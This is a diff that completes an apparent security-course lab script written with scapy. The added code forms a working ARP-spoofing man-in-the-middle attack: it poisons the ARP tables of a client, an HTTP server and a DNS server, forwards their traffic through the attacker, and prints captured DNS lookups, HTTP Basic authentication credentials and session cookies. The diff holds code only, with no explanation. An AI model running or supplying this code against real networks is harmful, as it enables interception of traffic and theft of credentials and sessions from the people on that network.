@@ -1,3 +1,5 @@
+# python3 cp2.1.passive.py --i eth0 --clientIP 10.4.22.223 --httpIP 10.4.22.38 --dnsIP 10.4.22.82
+
 from scapy.all import *
 
 import argparse
@@ -23,6 +25,7 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
+    return getmacbyip(IP)
 
 #ARP spoofs client, httpServer, dnsServer
 def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
@@ -36,17 +39,49 @@ def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
-
+    pkt = Ether(src=src_mac, dst=dst_mac) / ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=2)
+    sendp(pkt, inter=0.1)
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
-
-
+    pkt = ARP(hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP, op=2)
+    send(pkt)
+    
 # TODO: handle intercepted packets
 def interceptor(packet):
     global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
-
+    if packet[Ether].src == attackerMAC:
+        return
+    if packet.haslayer(DNS):
+        print("*hostname:%s" % packet[DNS].qd.qname.decode())
+        if packet[DNS].an:
+            print("*hostaddr:%s" % packet[DNS].an.rdata)
+    if packet.haslayer(Raw):
+        if "Authorization: Basic ".encode() in packet[Raw].load:
+            i = packet[Raw].load.index("Authorization: Basic ".encode())+21
+            j = packet[Raw].load.index("\r\nUser-Agent".encode())
+            print("*basicauth:%s" % packet[Raw].load[i:j].decode())
+        if "Set-Cookie: session=".encode() in packet[Raw].load:
+            i = packet[Raw].load.index("Set-Cookie: session=".encode())+20
+            j = packet[Raw].load.index("\r\nAccept-Ranges:".encode())
+            print("*cookie:%s" % packet[Raw].load[i:j].decode())
+    if packet.haslayer(IP):
+        if packet[IP].dst == clientIP:
+            packet[Ether].dst = clientMAC
+            packet[Ether].src = attackerMAC
+            sendp(packet)
+        elif packet[IP].dst == httpServerIP:
+            packet[Ether].dst = httpServerMAC
+            packet[Ether].src = attackerMAC
+            sendp(packet)
+        elif packet[IP].dst == dnsServerIP:
+            packet[Ether].dst = dnsServerMAC
+            packet[Ether].src = attackerMAC
+            sendp(packet)
+        # packet[Ether].src = attackerMAC
+        # sendp(packet)
+    # print(packet.summary())
 
 
 if __name__ == "__main__":
@@ -65,13 +100,25 @@ if __name__ == "__main__":
     httpServerMAC = mac(httpServerIP)
     dnsServerMAC = mac(dnsServerIP)
     attackerMAC = get_if_hwaddr(args.interface)
-
+    
+    # print("clientIP", clientIP)
+    # print("clientMAC", clientMAC)
+    
+    # print("httpServerIP", httpServerIP)
+    # print("httpServerMAC", httpServerMAC)
+    
+    # print("dnsServerIP", dnsServerIP)
+    # print("dnsServerMAC", dnsServerMAC)
+    
+    # print("attackerIP", attackerIP)
+    # print("attackerMAC", attackerMAC)
+    
     # start a new thread to ARP spoof in a loop
     spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
     spoof_th.start()
 
     # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
-    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
+    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor, 'filter':'port not 22 and not arp'}, daemon=True)
     sniff_th.start()
 
     try:
